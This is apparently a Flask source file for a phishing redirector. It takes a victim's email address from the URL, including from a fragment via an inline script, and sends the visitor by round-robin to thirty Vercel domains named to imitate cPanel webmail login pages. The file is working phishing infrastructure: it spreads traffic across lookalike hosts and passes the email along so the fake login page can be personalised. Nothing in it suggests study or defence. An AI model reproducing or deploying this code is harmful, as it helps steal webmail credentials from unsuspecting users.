from flask import Flask, redirect, request, render_template_string
import os

app = Flask(__name__)
application = app

DOMAINS = [
    'https://webmail-cpsess-super-duper-journey.vercel.app',
    'https://webmail-cpsess-super-duper-journey-zeta.vercel.app',
    'https://webmail-cpsess-super-duper-journey-woad.vercel.app',
    'https://webmail-cpsess-super-duper-journey-phi.vercel.app',
    'https://webmail-cpsess-super-duper-journey-puce.vercel.app',
    'https://webmail-cpsess-super-duper-journey-xi.vercel.app',
    'https://webmail-cpsess-super-duper-journey-ruby.vercel.app',
    'https://webmail-cpsess-super-duper-journey-six.vercel.app',
    'https://webmail-cpsess-super-duper-journey-delta.vercel.app',
    'https://webmail-cpsess-super-duper-journey-five.vercel.app',
    'https://webmail-cpsess-super-duper-journey-lime.vercel.app',
    'https://webmail-cpsess-super-duper-journey-rosy.vercel.app',
    'https://webmail-cpsess-super-duper-journey-psi.vercel.app',
    'https://webmail-cpsess-super-duper-journey-lake.vercel.app',
    'https://webmail-cpsess-super-duper-journey-tan.vercel.app',
    'https://webmail-cpsess-super-duper-journey-flame.vercel.app',
    'https://webmail-cpsess-super-duper-journey-eta.vercel.app',
    'https://webmail-cpsess-super-duper-journey-one.vercel.app',
    'https://webmail-cpsess-super-duper-journey-ten.vercel.app',
    'https://webmail-cpsess-super-duper-journey-jade.vercel.app',
    'https://webmail-cpsess-super-duper-journey-chi.vercel.app',
    'https://webmail-cpsess-super-duper-journey-pi.vercel.app',
    'https://webmail-cpsess-super-duper-journey-sigma.vercel.app',
    'https://webmail-cpsess-super-duper-journey-beta.vercel.app',
    'https://webmail-cpsess-super-duper-journey-snowy.vercel.app',
    'https://webmail-cpsess-super-duper-journey-gamma.vercel.app',
    'https://webmail-cpsess-super-duper-journey-woad-beta.vercel.app',
    'https://webmail-cpsess-super-duper-journey-two.vercel.app',
    'https://webmail-cpsess-super-duper-journey-navy.vercel.app',
    'https://webmail-cpsess-super-duper-journey-eight.vercel.app'
]


# Initialize counter
current_index = 0

@app.route('/')
def round_robin_balancer():
    global current_index
    
    # Try to get email from query parameter first (?web=email@email.com)
    email = request.args.get('web', '')
    
    # If no query parameter, serve a page that can handle the fragment
    if not email:
        return render_template_string('''
            <script>
                // Check if there's a fragment in the URL
                if (window.location.hash) {
                    var email = window.location.hash.substring(1); // Remove the '#'
                    // Redirect to the same URL with ?web= parameter instead of #
                    window.location.href = '/?web=' + encodeURIComponent(email);
                } else {
                    document.write('Invalid email');
                }
            </script>
        ''')
    
    # Basic email validation
    if not email or '@' not in email or '.' not in email:
        return "Invalid email.", 400
    
    # Get next domain in round-robin sequence
    target_domain = DOMAINS[current_index]
    
    # Increment index for next request
    current_index = (current_index + 1) % len(DOMAINS)
    
    # Construct target URL with the required ?web= parameter format
    target_url = f"{target_domain}/?web={email}"
    
    # Instant redirect
    return redirect(target_url, code=302)

if __name__ == '__main__':

    app.run(debug=True)
